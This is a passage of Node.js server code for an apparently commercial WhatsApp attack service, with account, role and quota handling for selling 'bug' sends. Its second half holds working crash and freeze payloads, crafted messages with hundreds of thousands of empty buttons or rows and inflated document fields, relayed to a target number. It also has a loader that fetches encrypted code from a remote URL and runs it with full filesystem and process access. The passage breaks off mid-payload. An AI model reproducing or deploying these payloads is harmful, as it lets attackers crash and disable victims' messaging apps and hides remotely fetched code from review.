  const subfolders = fs.readdirSync(permenmdPath);
  for (const subfolder of subfolders) {
    const subPath = path.join(permenmdPath, subfolder);
    let isDir = false;
    try { isDir = fs.statSync(subPath).isDirectory(); } catch (_) { continue; }
    if (!isDir) continue;

    // Skip folder user sendiri — itu udah masuk ke "private"
    if (excludeUsername && subfolder === excludeUsername) continue;

    const files = fs.readdirSync(subPath).filter(f => f.endsWith(".json"));
    for (const file of files) {
      const sessionName = `${path.basename(file, ".json")}`;
      if (activeConnections[sessionName]) {
        result.push({
          sessionName,
          owner: subfolder,    // username pemilik sender
          type: 'WA',
          isActive: true,
        });
      }
    }
  }
  return result;
}

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const role = (user.role || 'member').toLowerCase();

  // ── Helper: find owner folder for a sessionName ──
  const findOwnerFolder = (sessionName) => {
    try {
      const permenmdPath = path.join('permenmd');
      if (!fs.existsSync(permenmdPath)) return 'developer';
      const subfolders = fs.readdirSync(permenmdPath);
      for (const subfolder of subfolders) {
        const subPath = path.join(permenmdPath, subfolder);
        try {
          if (!fs.statSync(subPath).isDirectory()) continue;
        } catch (_) { continue; }
        const files = fs.readdirSync(subPath).filter(f => f.endsWith(".json"));
        if (files.includes(`${sessionName}.json`)) return subfolder;
      }
    } catch (_) {}
    return 'developer';
  };

  // ── Helper: get ALL active senders from EVERY source ──
  // Check activeConnections + biz + mess. Also scan permenmd folders
  // for .json files as fallback (for sessions that might be connecting).
  const getAllActiveSenders = () => {
    const result = [];
    const seen = new Set(); // deduplicate by sessionName

    // Source 1: activeConnections (regular WA sessions)
    for (const sessionName of Object.keys(activeConnections)) {
      if (seen.has(sessionName)) continue;
      seen.add(sessionName);
      result.push({
        sessionName,
        owner: findOwnerFolder(sessionName),
        type: 'WA',
        isActive: true,
      });
    }

    // Source 2: biz (WA Business sessions)
    if (typeof biz !== 'undefined') {
      for (const sessionName of Object.keys(biz)) {
        if (seen.has(sessionName)) continue;
        seen.add(sessionName);
        result.push({
          sessionName,
          owner: findOwnerFolder(sessionName),
          type: 'Business',
          isActive: true,
        });
      }
    }

    // Source 3: mess (WA Messenger sessions)
    if (typeof mess !== 'undefined') {
      for (const sessionName of Object.keys(mess)) {
        if (seen.has(sessionName)) continue;
        seen.add(sessionName);
        result.push({
          sessionName,
          owner: findOwnerFolder(sessionName),
          type: 'Messenger',
          isActive: true,
        });
      }
    }

    // Source 4: Folder scan fallback — find .json files in permenmd/*/
    // that have session dirs. These might be sessions that are still
    // connecting or were connected but lost reference.
    try {
      const permenmdPath = path.join('permenmd');
      if (fs.existsSync(permenmdPath)) {
        const subfolders = fs.readdirSync(permenmdPath);
        for (const subfolder of subfolders) {
          const subPath = path.join(permenmdPath, subfolder);
          try {
            if (!fs.statSync(subPath).isDirectory()) continue;
          } catch (_) { continue; }
          const files = fs.readdirSync(subPath).filter(f => f.endsWith(".json"));
          for (const file of files) {
            const sessionName = path.basename(file, ".json");
            if (seen.has(sessionName)) continue;
            // Only add if there's a corresponding session folder (means it was paired)
            const sessionDir = path.join(subPath, sessionName);
            if (fs.existsSync(sessionDir)) {
              seen.add(sessionName);
              result.push({
                sessionName,
                owner: subfolder,
                type: 'WA',
                isActive: false, // might not be connected right now
              });
            }
          }
        }
      }
    } catch (_) {}

    return result;
  };


  // ── Owner: unlimited ──
  if (role === 'owner') {
    const allSenders = getAllActiveSenders();
    console.log(`[MY-SENDER] ${user.username} (OWNER) → ${allSenders.length} senders (unlimited)`);
    return res.json({
      valid: true,
      connections: { private: [], global: allSenders },
      quota: { role, limit: -1, used: 0, remaining: -1, message: 'unlimited' },
    });
  }

  // ── VIP: lihat semua, quota 5 per 8 jam ──
  if (role === 'vip') {
    const allSenders = getAllActiveSenders();
    const quota = getVipQuota(user.username);
    console.log(`[MY-SENDER] ${user.username} (VIP) → ${allSenders.length} senders, quota: ${quota.used}/${quota.limit}`);
    return res.json({
      valid: true,
      connections: { private: [], global: allSenders },
      quota: quota,
    });
  }

  // ── Other VIP+ roles: unlimited ──
  const vipPlusRoles = ['founder', 'dev', 'high owner', 'high admin', 'moderator', 'seles'];
  if (vipPlusRoles.includes(role)) {
    const allSenders = getAllActiveSenders();
    console.log(`[MY-SENDER] ${user.username} (${role}) → ${allSenders.length} senders (unlimited)`);
    return res.json({
      valid: true,
      connections: { private: [], global: allSenders },
      quota: { role, limit: -1, used: 0, remaining: -1, message: 'unlimited' },
    });
  }

  // ── Member/Reseller/Admin: ONLY own private senders, NO global ──
  // Members MUST add their own sender. They cannot see or use
  // other users' senders. Global list is EMPTY for them.
  const privateConns = getActiveCredsInFolder(user.username);
  console.log(`[MY-SENDER] ${user.username} (role=${role}) → private=${privateConns.length}, global=0 (member must add own sender)`);
  return res.json({
    valid: true,
    connections: {
      private: privateConns,
      global: [], // EMPTY — members cannot see global senders
    },
    quota: {
      role,
      limit: 0,
      used: 0,
      remaining: 0,
      message: 'Add your own sender or upgrade to VIP',
    },
  });
});


// ═══════════════════════════════════════════════════════════════════════════
// VIP SENDER QUOTA SYSTEM
// VIP bisa lihat SEMUA sender, tapi cuma bisa kirim 5 bug per 8 jam.
// Setelah 8 jam, quota auto-reset ke 5 lagi. Owner unlimited.
// Storage: vipUsage.json
// ═══════════════════════════════════════════════════════════════════════════

const vipUsageFile = path.join(__dirname, 'vipUsage.json');
const VIP_DAILY_LIMIT = 5;
const VIP_WINDOW_HOURS = 8;
const VIP_WINDOW_MS = VIP_WINDOW_HOURS * 60 * 60 * 1000;

function loadVipUsage() {
  try {
    if (!fs.existsSync(vipUsageFile)) return {};
    return JSON.parse(fs.readFileSync(vipUsageFile, 'utf8'));
  } catch (_) { return {}; }
}

function saveVipUsage(data) {
  try { fs.writeFileSync(vipUsageFile, JSON.stringify(data, null, 2)); } catch (_) {}
}

function getVipQuota(username) {
  const usage = loadVipUsage();
  const now = Date.now();
  const userUsage = usage[username];

  if (!userUsage || (now - userUsage.windowStart) >= VIP_WINDOW_MS) {
    return {
      limit: VIP_DAILY_LIMIT,
      used: 0,
      remaining: VIP_DAILY_LIMIT,
      windowStart: now,
      windowHours: VIP_WINDOW_HOURS,
      resetAt: now + VIP_WINDOW_MS,
      resetInMs: VIP_WINDOW_MS,
    };
  }

  const used = userUsage.count;
  return {
    limit: VIP_DAILY_LIMIT,
    used: used,
    remaining: Math.max(0, VIP_DAILY_LIMIT - used),
    windowStart: userUsage.windowStart,
    windowHours: VIP_WINDOW_HOURS,
    resetAt: userUsage.windowStart + VIP_WINDOW_MS,
    resetInMs: (userUsage.windowStart + VIP_WINDOW_MS) - now,
  };
}

function incrementVipUsage(username) {
  const usage = loadVipUsage();
  const now = Date.now();

  if (!usage[username] || (now - usage[username].windowStart) >= VIP_WINDOW_MS) {
    usage[username] = { count: 1, windowStart: now };
  } else {
    usage[username].count++;
  }
  saveVipUsage(usage);
  return usage[username];
}

// GET /checkSenderLimit?key=...
app.get('/checkSenderLimit', (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: 'Invalid session key' });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ valid: false, message: 'User not found' });

  const role = (user.role || 'member').toLowerCase();

  if (role === 'owner') {
    return res.json({ valid: true, role, limit: -1, used: 0, remaining: -1, message: 'unlimited' });
  }

  if (role === 'vip') {
    const quota = getVipQuota(user.username);
    return res.json({ valid: true, role, ...quota });
  }

  const vipPlusRoles = ['founder', 'dev', 'high owner', 'high admin', 'moderator', 'seles'];
  if (vipPlusRoles.includes(role)) {
    const allSenders = getAllActiveSenders();
    console.log(`[MY-SENDER] ${user.username} (${role}) → ${allSenders.length} senders (unlimited)`);
    return res.json({ valid: true, role, limit: -1, used: 0, remaining: -1, message: 'unlimited' });
  }

  return res.json({ valid: true, role, limit: 0, used: 0, remaining: 0, message: 'no sender access — upgrade to VIP' });
});

app.get('/api/checkSenderLimit', (req, res) => {
  req.url = '/checkSenderLimit?' + (req.url.split('?')[1] || '');
  app.handle(req, res);
});


// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "OMHCMBUD")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
});

// 🔹 Endpoint device-permission - simpan/ambil permission akses device per username
const devicePermFile = './device_perms.json';
function loadDevicePerms() {
  try {
    if (require('fs').existsSync(devicePermFile)) {
      return JSON.parse(require('fs').readFileSync(devicePermFile, 'utf8'));
    }
  } catch(e) {}
  return {};
}
function saveDevicePerms(data) {
  require('fs').writeFileSync(devicePermFile, JSON.stringify(data, null, 2));
}

// GET /devicePerms - ambil permission untuk username ini
app.get("/devicePerms", (req, res) => {
  const { key, username } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  
  const perms = loadDevicePerms();
  const userPerm = perms[username?.toLowerCase()] || { approved: false, allDevices: false, devices: [] };
  
  // Owner selalu approved
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (requester?.role === 'owner' || keyInfo.username?.toLowerCase() === username?.toLowerCase()) {
    // Owner cek dirinya sendiri
    const isOwner = requester?.role === 'owner';
    if (isOwner && keyInfo.username === username) {
      return res.json({ valid: true, approved: true, allDevices: true, devices: [] });
    }
  }
  
  return res.json({ valid: true, ...userPerm });
});

// POST /setDevicePerm - owner atur permission user lain
app.post("/setDevicePerm", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, error: "Invalid session key" });
  
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') {
    return res.status(403).json({ valid: false, error: "Only owner can manage permissions" });
  }
  
  const { username, approved, allDevices, devices } = req.body;
  if (!username) return res.status(400).json({ valid: false, error: "Username required" });
  
  const perms = loadDevicePerms();
  perms[username.toLowerCase()] = {
    approved: approved === true || approved === 'true',
    allDevices: allDevices === true || allDevices === 'true',
    devices: Array.isArray(devices) ? devices : []
  };
  saveDevicePerms(perms);
  
  return res.json({ valid: true, message: "Permission updated" });
});

// GET /listDevicePerms - owner lihat semua permission
app.get("/listDevicePerms", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);
  if (!requester || requester.role !== 'owner') return res.status(403).json({ valid: false });
  const perms = loadDevicePerms();
  return res.json({ valid: true, perms });
});

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "reseller1", "seles"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    pairId: genPairId(),
  };

  db.push(newAccount);
  saveDatabase(db);
    
  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

// ===== Delete User (admin only) =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
        
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ LIST] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role (owner only) =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || (creator.role !== "owner" && creator.role !== "dev" && creator.role !== "seles")) {
    console.log("[❌ USERADD] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only owner/seles can add user with role." });
  }

  // Seles hanya bisa membuat akun member dan vip
  if (creator.role === "seles") {
    const allowedCreateRoles = ["member", "vip"];
    if (!allowedCreateRoles.includes((role || "member").toLowerCase())) {
      return res.json({ valid: true, authorized: false, message: "Seles hanya bisa membuat akun member dan vip." });
    }
    if (parseInt(day) > 30) {
      return res.json({ valid: true, created: false, message: "Seles can only create accounts up to 30 days." });
    }
  }


  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
    pairId: genPairId(),
  };

  db.push(newUser);
  saveDatabase(db);
    
  const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

// ===== Edit User Expired Date (reseller or owner) =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    return res.json({ valid: true, authorized: false, message: "Reseller can only add up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // ✅ Tambahan validasi role untuk reseller
  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  // Allow owner and admin to view logs; member only sees own logs
  const canViewAll = user && (user.role === "owner" || user.role === "admin");

  try {
    let logs = [];
    if (fs.existsSync("logUser.txt")) {
      const logContent = fs.readFileSync("logUser.txt", "utf-8");
      const lines = logContent.split("\n").filter(l => l.trim() !== "");
      logs = lines.map((line, i) => {
        // Parse: "actor Action target [detail]"
        const parts = line.trim().split(/\s+/);
        const actor = parts[0] || "system";
        const action = parts[1] || "activity";
        const target = parts[2] || "";
        const detail = parts.slice(3).join(" ");
        return {
          id: i + 1,
          timestamp: new Date(Date.now() - (lines.length - i) * 60000).toISOString(),
          activity: action.toLowerCase(),
          actor,
          target,
          description: line.trim(),
          details: {
            target: target || null,
            actor: actor || null,
            info: detail || null
          }
        };
      }).reverse(); // newest first
    }

    // Filter by user if not owner/admin
    if (!canViewAll && user) {
      logs = logs.filter(l => l.actor === user.username || l.target === user.username);
    }

    return res.json({ valid: true, authorized: canViewAll, logs });
  } catch (err) {
    return res.json({ valid: true, authorized: false, logs: [], error: "Failed to read log file." });
  }
});

// ===== Register (self-register untuk member/free user) =====
app.post("/register", (req, res) => {
  const { username, password, androidId } = req.body;

  if (!username || !password) {
    return res.json({ valid: false, message: "Username dan password wajib diisi" });
  }
  if (username.length < 3) {
    return res.json({ valid: false, message: "Username minimal 3 karakter" });
  }
  if (password.length < 4) {
    return res.json({ valid: false, message: "Password minimal 4 karakter" });
  }

  const db = loadDatabase();
  if (db.find(u => u.username === username)) {
    return res.json({ valid: false, message: "Username sudah digunakan" });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + 7); // 7 hari free trial

  const newAccount = {
    username: username,
    password: password,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
    pairId: genPairId(),
  };

  db.push(newAccount);
  saveDatabase(db);

  console.log("[✅ REGISTER] Akun baru dibuat:", newAccount);
  const logLine = `Self-Register ${username} (member, 7 days)\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({
    valid: true,
    created: true,
    message: "Akun berhasil dibuat! Silakan login.",
    user: { username: newAccount.username, role: newAccount.role, expiredDate: newAccount.expiredDate }
  });
});

// ============================================================
// API PREFIX ROUTER - Map semua /api/xxx/yyy ke endpoint asli
// ============================================================

// --- /api/auth/* ---
app.post('/api/auth/validate', (req, res) => { req.url = '/validate'; app.handle(req, res); });
app.get('/api/auth/myInfo', (req, res) => { req.url = '/myInfo'; app.handle(req, res); });
app.get('/api/auth/meByKey', (req, res) => { req.url = '/meByKey?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/auth/register', (req, res) => { req.url = '/register'; app.handle(req, res); });

// --- /api/user/* ---
app.post('/api/user/changepass', (req, res) => { req.url = '/changepass'; app.handle(req, res); });
app.get('/api/user/createAccount', (req, res) => { req.url = '/createAccount?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/deleteUser', (req, res) => { req.url = '/deleteUser?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/listUsers', (req, res) => { req.url = '/listUsers?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/userAdd', (req, res) => { req.url = '/userAdd?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/editUser', (req, res) => { req.url = '/editUser?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/user/getActivityLogs', (req, res) => { req.url = '/getLog?' + (req.url.split('?')[1]||''); app.handle(req, res); });

// --- /api/device-perm/* ---
app.get('/api/device/getPerms', (req, res) => { req.url = '/devicePerms?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/device/setPerm', (req, res) => { req.url = '/setDevicePerm?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/device/listPerms', (req, res) => { req.url = '/listDevicePerms?' + (req.url.split('?')[1]||''); app.handle(req, res); });
// ============================================================
// END API PREFIX ROUTER
// ============================================================

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;


async function TesterFc(sock, target) {
const OmhcSilence = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "YAKUZA X SILENCE"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
contactMessage: {
displayName: "x",
vcard: null
},
},
},
},
},
},
};

const JessicaSilence = generateWAMessageFromContent(target, OmhcSilence, {});

await sock.relayMessage(target, JessicaSilence.message, {
messageId: JessicaSilence.key.id
})
}

async function ConTolX(sock, target) {
const crashXI = {
interactiveMessage: {
body: {
text: "YakuzaXsilence"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
contactMessage: {
displayName: " ",
vcard: null
},
},
},
},
};

const crashXJ = generateWAMessageFromContent(target, crashXI, {});

await sock.relayMessage(target, crashXJ.message, {
participant: true,
messageId: crashXJ.key.id
})
}

async function BUMxC(sock, target) {
const CrBZB = {
interactiveMessage: {
body: {
text: "YakuzaXsilence"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
contextInfo: {
quotedMessage: {
albumMessage: {
expectedImageCount: 9999,
expectedVideoCount: 9999
},
},
},
},
};

const CrbB = generateWAMessageFromContent(target, CrBZB, {});

await sock.relayMessage(target, CrbB.message, {
participant: true,
messageId: CrbB.key.id
})
}

async function XcrashXA(sock, target) {
const CrbXA = {
interactiveMessage: {
header: {
title: "YakuzaXsilence",
hasMediaAttachment: true,
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
mimetype: "application/pdf",
fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
fileLength: 999999999,
pageCount: 1000,
mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
fileName: "allstart.PDF",
fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
mediaKeyTimestamp: "1779839963",
thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
jpegThumbnail: null,
contextInfo: {},
thumbnailHeight: 999,
thumbnailWidth: 999
}
},
body: {
text: "",
},
nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
};

const CrbXB = generateWAMessageFromContent(target, CrbXA, {});

await sock.relayMessage(target, CrbXB.message, {
participant: true,
messageId: CrbXB.key.id
})
}


//freze invisible x fc
async function crashXCrB(sock, target) {
    const CrBLL = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "YakuzaXsilence",
                                rows: Array.from({ length: 299999 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "CRB"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const CrBAS = generateWAMessageFromContent(target, CrBLL, {});

    await sock.relayMessage(target, CrBAS.message, {
    participant: true,
    messageId: CrBAS.key.id
    });

const CrbXT = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "YakuzaXsilence"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
};

const crashTX = generateWAMessageFromContent(target, CrbXT, {});

await sock.relayMessage(target, crashTX.message, {
participant: true,
messageId: crashTX.key.id
})
}

// function delay invisible x freeze 

async function DelayXxAh(sock, target) {
  const AXcrb = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
